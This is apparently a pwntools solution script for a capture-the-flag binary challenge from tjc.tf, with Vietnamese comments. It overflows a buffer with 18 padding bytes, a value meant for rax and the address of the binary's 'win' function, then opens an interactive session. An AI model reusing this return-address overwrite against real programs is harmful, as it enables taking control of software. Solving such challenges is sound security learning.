```python
from pwn import *

# p = remote(b'tjc.tf', 31080)

p = process('./out')
exe = ELF('./out')



input()

payload = b'a'*18 #offset
payload += p64(0x040128a) #gán giá trị này vào rax để so sánh
payload += p64(exe.sym['win']) # trỏ đến hàm win


p.sendafter(b'> ', payload)

p.interactive()
```
